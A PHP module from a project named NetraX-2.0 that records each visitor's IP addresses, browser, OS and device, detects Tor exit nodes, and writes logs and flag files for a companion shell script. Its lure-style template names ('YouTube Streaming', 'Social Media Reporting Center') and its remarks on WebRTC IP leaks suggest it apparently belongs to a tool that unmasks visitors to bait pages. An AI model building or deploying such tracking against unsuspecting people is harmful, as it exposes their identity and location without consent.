<?php
/* ════════════════════════════════════════════════════════════════════
   userInfo.php — Visitor Detection & Logging Helper
   ─────────────────────────────────────────────────────────────────
   Reusable, production-ready module that captures accurate visitor
   info: IP (Cloudflare-compatible), Browser, OS, Device type.
   Returns a structured array, prints to terminal, and appends
   logs to the project's data/ folder.

   Created for NetraX-2.0-2.O
   GitHub: https://github.com/Garuda-Netra
   ────────────────────────────────────────────────────────────────
   Usage:
     require_once __DIR__ . '/userInfo.php';
     $visitor = captureVisitorInfo();   // returns associative array
   ════════════════════════════════════════════════════════════════════ */

/* ── Guard: prevent double-include ─────────────────────────────── */
if (defined('NETRAX_USERINFO_LOADED')) {
    return;
}
define('NETRAX_USERINFO_LOADED', true);

/* ══════════════════════════════════════════════════════════════════
   0.  TEMPLATE NAME RESOLUTION
   ══════════════════════════════════════════════════════════════════
   The shell script (netraX-2.0.sh) writes the selected template index
   to  data/.active_template  when the user picks a template.
   This section reads that file and maps the index to a human-
   readable name used in every visitor log entry.
   ══════════════════════════════════════════════════════════════════ */

/** Canonical template index → display-name mapping. */
define('NETRAX_TEMPLATES', [
    1 => "Season's Greetings",
    2 => 'YouTube Streaming',
    3 => 'Online Conference',
    4 => 'Social Media Reporting Center',
]);

/**
 * Resolve the active template name.
 *
 * Reads data/.active_template (written by netraX-2.0.sh), validates the
 * index, and returns the matching display name.  Falls back to
 * 'NetraX-2.0' if the file is missing, empty, or contains an invalid value.
 *
 * @param  string|null $dataDir  Absolute path to the data/ directory.
 *                               Defaults to __DIR__/data.
 * @return string                Resolved template display name
 */
function resolveTemplateName(?string $dataDir = null): string
{
    static $cached = null;
    if ($cached !== null) {
        return $cached;
    }

    $dataDir  = $dataDir ?? (dirname(__FILE__, 2) . '/data');
    $flagFile = $dataDir . '/.active_template';

    if (is_file($flagFile) && is_readable($flagFile)) {
        $raw = trim(file_get_contents($flagFile));
        $idx = filter_var($raw, FILTER_VALIDATE_INT, [
            'options' => ['min_range' => 1, 'max_range' => max(array_keys(NETRAX_TEMPLATES))],
        ]);
        if ($idx !== false && isset(NETRAX_TEMPLATES[$idx])) {
            $cached = NETRAX_TEMPLATES[$idx];
            return $cached;
        }
    }

    /* Fallback — file missing, unreadable, or invalid */
    $cached = 'NetraX-2.0';
    return $cached;
}

/* ══════════════════════════════════════════════════════════════════
   1.  IP DETECTION  (Cloudflare-compatible)
   ══════════════════════════════════════════════════════════════════ */

/**
 * Check if an IP address is private/reserved (non-routable).
 *
 * @param  string $ip  Validated IP address
 * @return bool        True if the IP is private/reserved
 */
function isPrivateIP(string $ip): bool
{
    return filter_var(
        $ip,
        FILTER_VALIDATE_IP,
        FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
    ) === false;
}

/**
 * Detect the visitor's real public IP address(es).
 *
 * Scans ALL common IP headers to capture both IPv4 and IPv6
 * when available (dual-stack visitors behind tunnels).
 *
 * Headers checked (in priority order):
 *   1. HTTP_CF_CONNECTING_IP  (Cloudflare edge → origin)
 *   2. HTTP_X_REAL_IP         (common reverse-proxy header)
 *   3. HTTP_CLIENT_IP         (some load balancers)
 *   4. HTTP_X_FORWARDED_FOR   (proxy chain — all entries scanned)
 *   5. REMOTE_ADDR            (direct connection fallback)
 *
 * Every candidate is validated with filter_var() and private
 * IPs are skipped when possible.
 *
 * @return array ['ip' => string, 'ip_version' => string,
 *                'ipv4' => string, 'ipv6' => string]
 */
function detectClientIP(): array
{
    $result = ['ip' => 'unknown', 'ip_version' => '', 'ipv4' => '', 'ipv6' => ''];

    /* ── Collect all candidate IPs from every known header ── */
    $candidates = [];

    /* 1. Cloudflare (most trusted behind CF tunnel) */
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $candidates[] = trim($_SERVER['HTTP_CF_CONNECTING_IP']);
    }

    /* 2. X-Real-IP (common with nginx / some tunnels) */
    if (!empty($_SERVER['HTTP_X_REAL_IP'])) {
        $candidates[] = trim($_SERVER['HTTP_X_REAL_IP']);
    }

    /* 3. Client-IP (some load balancers) */
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $candidates[] = trim($_SERVER['HTTP_CLIENT_IP']);
    }

    /* 4. X-Forwarded-For (may contain chain: client, proxy1, proxy2) */
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        foreach (array_map('trim', explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])) as $xff) {
            $candidates[] = $xff;
        }
    }

    /* 5. REMOTE_ADDR (direct connection / tunnel loopback) */
    $candidates[] = $_SERVER['REMOTE_ADDR'] ?? '';

    /* ── Scan candidates: separate public IPv4 and IPv6 ── */
    $primaryIP  = '';
    $publicIPv4 = '';
    $publicIPv6 = '';

    foreach ($candidates as $ip) {
        if ($ip === '' || !filter_var($ip, FILTER_VALIDATE_IP)) {
            continue;
        }

        $isPublic = !isPrivateIP($ip);

        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
            if ($publicIPv4 === '' && $isPublic) {
                $publicIPv4 = $ip;
            }
        } elseif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
            if ($publicIPv6 === '' && $isPublic) {
                $publicIPv6 = $ip;
            }
        }

        /* First public IP encountered is the primary (header priority) */
        if ($primaryIP === '' && $isPublic) {
            $primaryIP = $ip;
        }
    }

    /* ── If no public IP found, fall back to the first valid IP ── */
    if ($primaryIP === '') {
        foreach ($candidates as $ip) {
            if ($ip !== '' && filter_var($ip, FILTER_VALIDATE_IP)) {
                $primaryIP = $ip;
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && $publicIPv4 === '') {
                    $publicIPv4 = $ip;
                } elseif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) && $publicIPv6 === '') {
                    $publicIPv6 = $ip;
                }
                break;
            }
        }
    }

    $result['ip']         = $primaryIP ?: 'unknown';
    $result['ip_version'] = detectIPVersion($primaryIP ?: '');
    $result['ipv4']       = $publicIPv4;
    $result['ipv6']       = $publicIPv6;

    return $result;
}

/**
 * Determine IP version string.
 *
 * @param  string $ip  Validated IP address
 * @return string      'IPv4', 'IPv6', or ''
 */
function detectIPVersion(string $ip): string
{
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
        return 'IPv4';
    }
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
        return 'IPv6';
    }
    return '';
}

/* ══════════════════════════════════════════════════════════════════
   2.  BROWSER DETECTION
   ══════════════════════════════════════════════════════════════════ */

/**
 * Detect browser name and version from the User-Agent string.
 *
 * Detection order matters — e.g. Edge and Opera include "Chrome"
 * in their UA, so they must be checked first.
 *
 * @param  string $ua  Raw User-Agent header
 * @return array       ['browser' => string, 'browser_version' => string]
 */
function detectBrowser(string $ua): array
{
    $result = ['browser' => 'Unknown', 'browser_version' => ''];

    if (empty($ua)) {
        return $result;
    }

    /*
     * Patterns ordered by specificity (most-specific first).
     * Each entry: [regex_pattern, friendly_name]
     * The first capture group should yield the version number.
     */
    $patterns = [
        /* Edge (Chromium-based) must precede Chrome */
        ['#Edg(?:e|A|iOS)?/(\d+[\d.]*)#i',          'Edge'],
        /* Opera / OPR must precede Chrome */
        ['#(?:OPR|Opera)[/ ](\d+[\d.]*)#i',          'Opera'],
        /* Samsung Internet */
        ['#SamsungBrowser/(\d+[\d.]*)#i',             'Samsung Internet'],
        /* UCBrowser */
        ['#UCBrowser/(\d+[\d.]*)#i',                  'UC Browser'],
        /* Brave (identifies itself as Chrome but includes "Brave") */
        ['#Brave(?:/| )(\d+[\d.]*)#i',               'Brave'],
        /* Vivaldi */
        ['#Vivaldi/(\d+[\d.]*)#i',                    'Vivaldi'],
        /* Firefox (must precede generic checks) */
        ['#(?:Firefox|FxiOS)/(\d+[\d.]*)#i',         'Firefox'],
        /* Chrome / CriOS (after Edge, Opera, Samsung, Brave, Vivaldi) */
        ['#(?:Chrome|CriOS)/(\d+[\d.]*)#i',          'Chrome'],
        /* Safari — only if "Safari/" is present AND Chrome/Chromium is absent */
        ['#Version/(\d+[\d.]*).*Safari#i',            'Safari'],
        /* Internet Explorer */
        ['#(?:MSIE |Trident/.*rv:)(\d+[\d.]*)#i',    'Internet Explorer'],
    ];

    foreach ($patterns as [$regex, $name]) {
        if (preg_match($regex, $ua, $m)) {
            $result['browser']         = $name;
            $result['browser_version'] = $m[1] ?? '';
            return $result;
        }
    }

    return $result;
}

/* ══════════════════════════════════════════════════════════════════
   3.  OS DETECTION
   ══════════════════════════════════════════════════════════════════ */

/**
 * Detect operating system from the User-Agent string.
 *
 * Returns human-readable names like "Windows 10", "macOS",
 * "Android 13", "iOS 17.2", "Linux".
 *
 * @param  string $ua  Raw User-Agent header
 * @return string      Readable OS name or 'Unknown'
 */
function detectOS(string $ua): string
{
    $osInfo = detectOSInfo($ua);
    return $osInfo['os'];
}

/**
 * Detect operating system and preserve a sanitized copy of raw UA.
 *
 * Structured format:
 * [
 *   'os' => 'Android 13',
 *   'raw_user_agent' => 'Mozilla/...'
 * ]
 *
 * @param  string $ua  Raw User-Agent header
 * @return array{os:string,raw_user_agent:string}
 */
function detectOSInfo(string $ua): array
{
    $uaSanitized = sanitizeUserAgent($ua);
    if ($uaSanitized === '') {
        return ['os' => 'Unknown', 'raw_user_agent' => ''];
    }

    /* ── iOS (must run before macOS checks) ───────────────────── */
    if (preg_match('#\b(?:iPhone|iPod|iPad)\b#i', $uaSanitized)) {
        if (
            preg_match('#\b(?:CPU(?: iPhone)? OS|iPhone OS)\s+([0-9_]+(?:\.[0-9]+)*)\b#i', $uaSanitized, $m)
            || preg_match('#\bOS\s+([0-9_]+)\s+like\s+Mac\s+OS\s+X\b#i', $uaSanitized, $m)
        ) {
            $version = normalizeUaVersion($m[1] ?? '');
            return [
                'os' => ($version !== '' ? 'iOS ' . $version : 'iOS'),
                'raw_user_agent' => $uaSanitized,
            ];
        }

        return ['os' => 'iOS', 'raw_user_agent' => $uaSanitized];
    }

    /* ── Android ──────────────────────────────────────────────── */
    if (preg_match('#\bAndroid\s+([0-9]+(?:\.[0-9]+){0,2})\b#i', $uaSanitized, $m)) {
        $version = normalizeUaVersion($m[1] ?? '');
        return [
            'os' => ($version !== '' ? 'Android ' . $version : 'Android'),
            'raw_user_agent' => $uaSanitized,
        ];
    }
    if (preg_match('#\bAndroid\b#i', $uaSanitized)) {
        return ['os' => 'Android', 'raw_user_agent' => $uaSanitized];
    }

    /* ── Windows (NT version mapping) ─────────────────────────── */
    if (preg_match('#\bWindows\s+NT\s+([0-9]+(?:\.[0-9]+)?)\b#i', $uaSanitized, $m)) {
        return [
            'os' => 'Windows ' . mapWindowsVersion($m[1]),
            'raw_user_agent' => $uaSanitized,
        ];
    }
    if (preg_match('#\bWindows\b#i', $uaSanitized)) {
        return ['os' => 'Windows', 'raw_user_agent' => $uaSanitized];
    }

    /* ── macOS ────────────────────────────────────────────────── */
    if (preg_match('#\bMac\s+OS\s+X\s+([0-9_]+(?:\.[0-9_]+)*)\b#i', $uaSanitized, $m)) {
        $version = normalizeUaVersion($m[1] ?? '');
        return [
            'os' => ($version !== '' ? 'macOS ' . $version : 'macOS'),
            'raw_user_agent' => $uaSanitized,
        ];
    }
    if (preg_match('#\bMacintosh\b|\bMac\s+OS\b#i', $uaSanitized)) {
        return ['os' => 'macOS', 'raw_user_agent' => $uaSanitized];
    }

    /* ── Chrome OS ────────────────────────────────────────────── */
    if (preg_match('#\bCrOS\b#i', $uaSanitized)) {
        return ['os' => 'Chrome OS', 'raw_user_agent' => $uaSanitized];
    }

    /* ── Linux (generic fallback) ─────────────────────────────── */
    if (preg_match('#\bLinux\b#i', $uaSanitized)) {
        return ['os' => 'Linux', 'raw_user_agent' => $uaSanitized];
    }

    return ['os' => 'Unknown', 'raw_user_agent' => $uaSanitized];
}

/**
 * Sanitize User-Agent value used by parsing routines.
 * Removes control chars and bounds length to avoid abuse.
 */
function sanitizeUserAgent(string $ua): string
{
    $ua = trim($ua);
    if ($ua === '') {
        return '';
    }

    $ua = preg_replace('/[\x00-\x1F\x7F]/u', '', $ua) ?? '';
    if ($ua === '') {
        return '';
    }

    return substr($ua, 0, 1024);
}

/**
 * Normalize extracted version tokens (e.g. 16_5 -> 16.5).
 */
function normalizeUaVersion(string $version): string
{
    $version = str_replace('_', '.', trim($version));
    $version = preg_replace('/[^0-9.]/', '', $version) ?? '';
    $version = preg_replace('/\.{2,}/', '.', $version) ?? '';
    return trim($version, '.');
}

/**
 * Map Windows NT kernel version to marketing name.
 *
 * @param  string $ntVersion  e.g. "10.0", "6.1"
 * @return string             e.g. "10", "7"
 */
function mapWindowsVersion(string $ntVersion): string
{
    $map = [
        '10.0' => '10/11',   // NT 10.0 covers both Win 10 & 11
        '6.3'  => '8.1',
        '6.2'  => '8',
        '6.1'  => '7',
        '6.0'  => 'Vista',
        '5.2'  => 'XP x64',
        '5.1'  => 'XP',
        '5.0'  => '2000',
    ];
    return $map[$ntVersion] ?? $ntVersion;
}

/**
 * Map macOS version numbers to code names.
 *
 * @param  int $major  Major version (e.g. 10, 11, 12 …)
 * @param  int $minor  Minor version
 * @return string      Code name or empty string
 */
function mapMacOSVersion(int $major, int $minor): string
{
    /* macOS 11+ uses major version only */
    if ($major >= 11) {
        $names = [
            11 => '11 Big Sur',
            12 => '12 Monterey',
            13 => '13 Ventura',
            14 => '14 Sonoma',
            15 => '15 Sequoia',
        ];
        return $names[$major] ?? (string) $major;
    }
    /* macOS 10.x */
    $names10 = [
        15 => '10.15 Catalina',
        14 => '10.14 Mojave',
        13 => '10.13 High Sierra',
        12 => '10.12 Sierra',
        11 => '10.11 El Capitan',
        10 => '10.10 Yosemite',
        9  => '10.9 Mavericks',
    ];
    return $names10[$minor] ?? "10.{$minor}";
}

/* ══════════════════════════════════════════════════════════════════
   4.  DEVICE TYPE DETECTION
   ══════════════════════════════════════════════════════════════════ */

/**
 * Classify device as Mobile, Tablet, or Desktop.
 *
 * Uses conservative keyword matching against the UA string.
 * No fingerprinting or invasive techniques.
 *
 * @param  string $ua  Raw User-Agent header
 * @return string      'Mobile' | 'Tablet' | 'Desktop'
 */
function detectDeviceType(string $ua): string
{
    if (empty($ua)) {
        return 'Unknown';
    }

    /* ── Tablet patterns (check before mobile — tablets often contain "Mobile" too) ── */
    $tabletPatterns = '#\b(iPad|Tablet|PlayBook|Silk|Kindle|SM-T|GT-P|MediaPad|MatePad|Tab\s|SAMSUNG.*Tab)\b#i';
    if (preg_match($tabletPatterns, $ua)) {
        return 'Tablet';
    }

    /* ── iPadOS 13+ spoofs macOS UA but we can catch "Macintosh" + touch ── */
    /* This is best-effort; iPadOS desktop-mode UAs are indistinguishable */

    /* ── Mobile patterns ─────────────────────────────────────── */
    $mobilePatterns = '#\b(Mobile|Android|iPhone|iPod|Opera Mini|Opera Mobi|IEMobile'
                    . '|Windows Phone|BlackBerry|BB10|webOS|Symbian|MIDP)\b#i';
    if (preg_match($mobilePatterns, $ua)) {
        return 'Mobile';
    }

    /* ── Default: Desktop ────────────────────────────────────── */
    return 'Desktop';
}

/* ══════════════════════════════════════════════════════════════════
   5.  MAIN CAPTURE FUNCTION
   ══════════════════════════════════════════════════════════════════ */

/**
 * Capture all visitor information and return a structured array.
 *
 * This is the primary public function. Call it once per request.
 *
 * Output array:
 *   'ip'              => string   Primary client IP or 'unknown'
 *   'ip_version'      => string   'IPv4' | 'IPv6' | ''
 *   'ipv4'            => string   Public IPv4 ('' if unavailable)
 *   'ipv6'            => string   Public IPv6 ('' if unavailable)
 *   'browser'         => string   Browser name
 *   'browser_version' => string   Browser version
 *   'os'              => string   Operating system
 *   'device_type'     => string   'Mobile' | 'Tablet' | 'Desktop'
 *   'user_agent'      => string   Raw UA (for reference)
 *   'timestamp'       => string   ISO 8601 timestamp
 *
 * @return array  Structured visitor information
 */
function captureVisitorInfo(): array
{
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

    /* Detect each dimension */
    $ipInfo    = detectClientIP();
    $browser   = detectBrowser($ua);
    $os        = detectOS($ua);
    $device    = detectDeviceType($ua);
    $timestamp = date('Y-m-d H:i:s');

    return [
        'ip'              => $ipInfo['ip'],
        'ip_version'      => $ipInfo['ip_version'],
        'ipv4'            => $ipInfo['ipv4'],
        'ipv6'            => $ipInfo['ipv6'],
        'browser'         => $browser['browser'],
        'browser_version' => $browser['browser_version'],
        'os'              => $os,
        'device_type'     => $device,
        'user_agent'      => $ua,
        'timestamp'       => $timestamp,
    ];
}

/* ══════════════════════════════════════════════════════════════════
   6.  TERMINAL OUTPUT
   ══════════════════════════════════════════════════════════════════ */

/**
 * Format a visitor info array as a clean terminal-friendly string.
 *
 * @param  array       $info          Output of captureVisitorInfo()
 * @param  string|null $templateName  Resolved template display name.
 *                                    Falls back to resolveTemplateName().
 * @return string                     Formatted multi-line block
 */
function formatVisitorLog(array $info, ?string $templateName = null): string
{
    $templateName = $templateName ?? resolveTemplateName();
    $divider      = str_repeat('─', 52);

    $ipLabel = $info['ip'];
    if (!empty($info['ip_version'])) {
        $ipLabel .= ' (' . $info['ip_version'] . ')';
    }

    /* Build separate IPv4 / IPv6 labels when available */
    $ipv4Label = !empty($info['ipv4']) ? $info['ipv4'] : 'Not detected';
    $ipv6Label = !empty($info['ipv6']) ? $info['ipv6'] : 'Not detected';

    $browserLabel = $info['browser'];
    if (!empty($info['browser_version'])) {
        $browserLabel .= ' ' . $info['browser_version'];
    }

    $lines = [
        '',
        $divider,
        '[VISITOR LOG]  ' . $templateName,
        $divider,
        'IPv4    : ' . $ipv4Label,
        'IPv6    : ' . $ipv6Label,
        'Browser : ' . $browserLabel,
        'OS      : ' . $info['os'],
        'Device  : ' . $info['device_type'],
        'Tor     : ' . ((!empty($info['is_tor'])) ? 'YES — Tor exit node' : 'No'),
        'Time    : ' . $info['timestamp'],
        $divider,
    ];

    /* Append a prominent warning block when Tor is confirmed */
    if (!empty($info['is_tor'])) {
        $lines[] = '';
        $lines[] = '!! TOR BROWSER DETECTED — connection is anonymized !!';
        $lines[] = '   WebRTC leaks are BLOCKED by Tor Browser.';
        $lines[] = '   Real IP cannot be retrieved via WebRTC on this visit.';
        $lines[] = $divider;
    }

    $lines[] = '';

    return implode("\n", $lines);
}

/**
 * Print the visitor log to PHP's stderr (appears in the built-in
 * PHP server terminal) and also to error_log.
 *
 * @param string $logText  Pre-formatted log string
 */
function printVisitorToTerminal(string $logText): void
{
    /* stderr → shows in `php -S` terminal */
    file_put_contents('php://stderr', $logText);
    /* error_log → respects php.ini log destination */
    error_log($logText);
}

/* ══════════════════════════════════════════════════════════════════
   7.  DATA STORAGE  (append-only JSON lines → data/visitor_logs.jsonl)
   ══════════════════════════════════════════════════════════════════ */

/**
 * Append a visitor record as a JSON line to the log file.
 *
 * File is created automatically if it does not exist.
 * Uses file locking (LOCK_EX) to prevent race conditions.
 *
 * @param array  $info     Output of captureVisitorInfo()
 * @param string $dataDir  Absolute path to the data/ directory
 */
function saveVisitorLog(array $info, string $dataDir): void
{
    /* Ensure data directory exists */
    if (!is_dir($dataDir)) {
        mkdir($dataDir, 0750, true);
    }

    $logFile = $dataDir . '/visitor_logs.jsonl';

    /* Build a clean record (exclude raw UA from JSON to keep lines compact) */
    $record = [
        'ip'              => $info['ip'],
        'ip_version'      => $info['ip_version'],
        'ipv4'            => $info['ipv4'] ?? '',
        'ipv6'            => $info['ipv6'] ?? '',
        'browser'         => $info['browser'],
        'browser_version' => $info['browser_version'],
        'os'              => $info['os'],
        'device_type'     => $info['device_type'],
        'is_tor'          => $info['is_tor'] ?? false,
        'template'        => $info['template'] ?? resolveTemplateName(),
        'timestamp'       => $info['timestamp'],
    ];

    $jsonLine = json_encode($record, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) . "\n";

    /* Append with exclusive file lock */
    $fp = fopen($logFile, 'a');
    if ($fp) {
        flock($fp, LOCK_EX);
        fwrite($fp, $jsonLine);
        flock($fp, LOCK_UN);
        fclose($fp);
        @chmod($logFile, 0640);
    }
}

/* ══════════════════════════════════════════════════════════════════
   8.  ALSO SAVE READABLE TEXT LOG  (data/visitor_logs.txt)
   ══════════════════════════════════════════════════════════════════ */

/**
 * Append a human-readable visitor entry to a text log file.
 *
 * @param string $logText  Pre-formatted log block
 * @param string $dataDir  Absolute path to the data/ directory
 */
function saveVisitorLogReadable(string $logText, string $dataDir): void
{
    if (!is_dir($dataDir)) {
        mkdir($dataDir, 0750, true);
    }

    $logFile = $dataDir . '/visitor_logs.txt';

    $fp = fopen($logFile, 'a');
    if ($fp) {
        flock($fp, LOCK_EX);
        fwrite($fp, $logText);
        flock($fp, LOCK_UN);
        fclose($fp);
        @chmod($logFile, 0640);
    }
}

/* ══════════════════════════════════════════════════════════════════
   9.  ALL-IN-ONE: CAPTURE → LOG → SAVE → RETURN
   ══════════════════════════════════════════════════════════════════

   Call this single function from ip.php or any global bootstrap.
   It performs the full pipeline and returns the info array.
   ══════════════════════════════════════════════════════════════════ */

/**
 * Capture visitor info, print to terminal, save to data/, and
 * signal the shell script via a flag file.
 *
 * If critical fields (IP, browser, OS) are all unknown/empty,
 * only prints a "details not found" notice to the terminal.
 *
 * @param  string|null $dataDir  Override data directory (default: __DIR__/data)
 * @return array                 Structured visitor info
 */
function processVisitor(?string $dataDir = null): array
{
    $dataDir = $dataDir ?? (dirname(__FILE__, 2) . '/data');

    /* Resolve the active template name once (cached internally) */
    $templateName = resolveTemplateName($dataDir);

    /* Capture */
    $info = captureVisitorInfo();

    /* Attach the resolved template name to the info array */
    $info['template'] = $templateName;

    /* Tor exit node detection (IPv4: DNS; IPv6: cached bulk list) */
    $info['is_tor'] = detectTorExit($info['ip'], $dataDir);

    /* Check if we got meaningful data */
    $hasIP      = ($info['ip'] !== 'unknown' && $info['ip'] !== '');
    $hasBrowser = ($info['browser'] !== 'Unknown');
    $hasOS      = ($info['os'] !== 'Unknown');

    if (!$hasIP && !$hasBrowser && !$hasOS) {
        /* No meaningful visitor details detected — print notice only */
        $notice = "\n[VISITOR LOG] Details not found — no IP, browser, or OS detected.\n"
                . "Template: " . $templateName . "\n"
                . "Time: " . $info['timestamp'] . "\n";
        file_put_contents('php://stderr', $notice);
        error_log($notice);
        return $info;
    }

    /* Format — pass the resolved template name */
    $logText = formatVisitorLog($info, $templateName);

    /* Terminal output */
    printVisitorToTerminal($logText);

    /* Save JSON line log (includes template field) */
    saveVisitorLog($info, $dataDir);

    /* Save readable text log */
    saveVisitorLogReadable($logText, $dataDir);

    /* Signal the shell script (netraX-2.0.sh checkfound loop) */
    $flagContent = $logText;
    file_put_contents($dataDir . '/.flag_visitor', $flagContent);

    /* Write a dedicated Tor flag when the visitor is on Tor */
    if (!empty($info['is_tor'])) {
        $torAlert = "TOR EXIT NODE DETECTED\n"
                  . 'IP   : ' . $info['ip'] . "\n"
                  . 'Time : ' . $info['timestamp'] . "\n";
        file_put_contents($dataDir . '/.flag_tor', $torAlert);
    }

    return $info;
}

/* ══════════════════════════════════════════════════════
   10.  TOR EXIT NODE DETECTION
   ══════════════════════════════════════════════════════

   IPv4 exit nodes — real-time DNS query against Tor Project DNSEL:
     <reversed-quad>.dnsel.torproject.org → 127.0.0.2 = exit node

   IPv6 exit nodes — checked against a locally-cached bulk exit list
     (data/.tor_exit_cache).  Cache is refreshed every 24 hours from
     https://check.torproject.org/torbulkexitlist automatically.
     Falls back gracefully if the remote list cannot be fetched.
   ══════════════════════════════════════════════════════ */

/**
 * Refresh the Tor bulk exit list cache if missing or older than 24 h.
 *
 * Stored at data/.tor_exit_cache (one IP per line, plain text).
 * Silently skips on network failure so the main flow is never blocked.
 *
 * @param string $dataDir  Absolute path to the data/ directory
 */
function refreshTorCache(string $dataDir): void
{
    $cacheFile = $dataDir . '/.tor_exit_cache';
    $maxAge    = 86400; // 24 hours in seconds

    if (is_file($cacheFile) && (time() - (int) @filemtime($cacheFile)) < $maxAge) {
        return; // cache is fresh
    }

    $list = @file_get_contents('https://check.torproject.org/torbulkexitlist');
    if ($list !== false && strlen($list) > 200) {
        if (!is_dir($dataDir)) {
            mkdir($dataDir, 0750, true);
        }
        @file_put_contents($cacheFile, $list);
        @chmod($cacheFile, 0640);
    }
}

/**
 * Search the cached Tor bulk exit list for a given IP address.
 *
 * @param  string $ip       IP address to look up
 * @param  string $dataDir  Absolute path to the data/ directory
 * @return bool             True if found in cache
 */
function checkTorBulkList(string $ip, string $dataDir): bool
{
    $cacheFile = $dataDir . '/.tor_exit_cache';
    if (!is_file($cacheFile)) {
        return false;
    }
    $handle = @fopen($cacheFile, 'r');
    if (!$handle) {
        return false;
    }
    $found = false;
    while (($line = fgets($handle)) !== false) {
        if (trim($line) === $ip) {
            $found = true;
            break;
        }
    }
    fclose($handle);
    return $found;
}

/**
 * Detect whether an IP address belongs to a Tor exit node.
 *
 * IPv4 — real-time DNS query (fast, ~10–50 ms on good connectivity):
 *   Reverses the quad and queries <reversed>.dnsel.torproject.org.
 *   A 127.0.0.2 response confirms a Tor exit node.
 *
 * IPv6 — bulk list cache:
 *   Refreshes data/.tor_exit_cache from Tor Project every 24 h and
 *   searches it for the address.  IPv6 exit nodes are rarer but do
 *   exist (e.g. Contabo-hosted nodes like 2a03:4000::/23).
 *
 * @param  string $ip       IP address to check
 * @param  string $dataDir  Absolute path to data/ (needed for IPv6 cache)
 * @return bool             True if confirmed Tor exit node
 */
function detectTorExit(string $ip, string $dataDir): bool
{
    if ($ip === '' || $ip === 'unknown') {
        return false;
    }

    /* ── IPv4: real-time DNSEL query ───────────────────────────── */
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
        $reversed = implode('.', array_reverse(explode('.', $ip)));
        $host     = $reversed . '.dnsel.torproject.org';
        $resolved = @gethostbyname($host);
        return $resolved === '127.0.0.2';
    }

    /* ── IPv6: cached bulk exit list ───────────────────────────── */
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
        refreshTorCache($dataDir);
        return checkTorBulkList($ip, $dataDir);
    }

    return false;
}
